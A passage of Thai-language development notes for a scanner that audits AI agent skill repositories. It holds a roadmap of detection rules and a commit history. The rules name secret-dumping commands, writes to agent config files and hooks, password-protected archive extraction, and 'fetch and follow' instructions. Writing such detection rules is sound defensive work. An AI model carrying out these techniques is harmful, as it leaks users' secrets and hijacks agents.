2. ~~จำกัดไฟล์ต่อ skill แทนต่อ repo~~ **ทำแล้ว** (Claude, 2026-11-11 ดูบันทึกด้านบน) เหลือแค่เรื่องที่ยังไม่แก้: ย่อรายการ coverage ของ repo แบบแค็ตตาล็อก และผลของ repo หลาย skill ที่ cache ไว้จะเปลี่ยนเมื่อ bump `SCANNER_VERSION` ตอนทำข้อ 3
3. **กฎแบบ S สำหรับจุดบอด** ทำหลัง eval วันที่ 12 พ.ย. ต้อง bump `SCANNER_VERSION` และทุกข้อต้องมี fixture ใน `fixtures/eval/gaps.json` อยู่แล้ว ย้ายไป `risky.json` เมื่อจับได้
   - SUP-05: `npx`/`uvx`/`pip install` ที่ไม่ล็อกเวอร์ชัน (low)
   - MET-03: ตรวจ frontmatter ตาม agentskills.io: `name` 1–64 ตัว a-z0-9-, ห้ามขึ้นต้นหรือลงท้ายด้วย `-`, ห้าม `--`, ต้องตรงกับชื่อโฟลเดอร์; `description` 1–1024 ตัว (info–low) ต้องใช้ YAML parser แบบ safe
   - MET-01: key ที่ฝังในไฟล์ (รูปแบบ AWS/GitHub/Anthropic/OpenAI/private key block) **mask เหลือ 4 ตัวแรก** ก่อนเก็บลง excerpt
   - EXF-02: `env`/`printenv`/dump `os.environ`/`process.env` ทั้งก้อน (high) ถ้าเจอคู่กับการส่งออกให้เป็น critical
   - PRV-04: เขียนหรือแก้ `CLAUDE.md`/`AGENTS.md`/`.cursorrules`/settings/hooks ของ agent (high)
   - SUP-02: `unzip -P`/`7z -p` (critical)
   - SUP-04: "fetch … and follow" (high + ระบุว่า "ตรวจสอบไม่ได้")
4. **แยก code block ออกจากเนื้อความใน markdown** เพื่อแก้เคสหลอก `security-doc-example` ที่ยังเตือนผิด
   - parse fence ``` พร้อมเลขบรรทัด และส่ง `context` ไปกับ finding
   - ตัวอย่างใน code block ที่เนื้อความรอบๆ บอกว่า "ตัวอย่าง/ให้ flag/อย่าทำ" อาจลดระดับลง ต้องวัดด้วย eval ก่อนตัดสิน
5. **หลังทำข้อ 1–4** รัน eval เต็ม (ทั้ง rules และ `--judge`) อัปเดต README แล้วถามผู้ใช้ว่าจะเปิด LLM บนเว็บไหม
6. **ภายหลัง (ถ้าผู้ใช้ต้องการ)**
   - `GITHUB_TOKEN` แบบ fine-grained อ่านอย่างเดียวใน Vercel
   - จำกัดจำนวนสแกนต่อ IP (ต้องมีที่เก็บ เช่น ตารางใน Postgres)
   - CSP header
   - map rule id กับ OWASP AST01–10 (ต้องอ่าน `top10.md` ใน repo ของ OWASP ก่อน)
   - หน้า "วิธีการตรวจ" ที่อธิบายขอบเขตและข้อจำกัด (สเปกหัวข้อ 9)

---

## 9. ประวัติ commit

```
e44ec14 Connect the LLM judge to Groq and measure it in the eval
a7f42fb Add provider-neutral LLM judge (off until a provider is configured)
d53bf57 Add scanner eval and fix the false positives it found
f8b18c7 Rate skipped-confirmation phrasing as its own medium rule
530cc61 Scan real repos end to end: GitHub fetcher, scan API, report page
8646fe2 Add scanner engine: hidden-text and risky-command rules, scoring, tests
3e4b431 Add Neon database with Drizzle: scans and findings schema, first migration
c71c4f3 Scaffold Skill Auditor: Next.js, Tailwind, shadcn/ui, landing page, health check
```
